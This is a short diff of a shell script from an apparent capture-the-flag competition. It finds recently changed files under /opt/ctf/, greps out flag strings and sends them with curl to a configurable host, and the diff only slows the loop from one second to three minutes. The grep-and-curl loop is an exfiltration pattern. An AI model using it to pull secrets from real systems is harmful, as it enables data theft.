@@ -10,6 +10,6 @@ for SVC in `find /opt/ctf/ -name append -type d`;
 do
 	FLAGS=`find $SVC -type f -cmin -3 -exec grep -o 'FLG[[:alnum:]]\{13\}' {} \; | paste -sd '/'`
 	curl  "$HOST:$PORT/$FLAGS"
-	sleep 1
+	sleep 3m
 done
 done
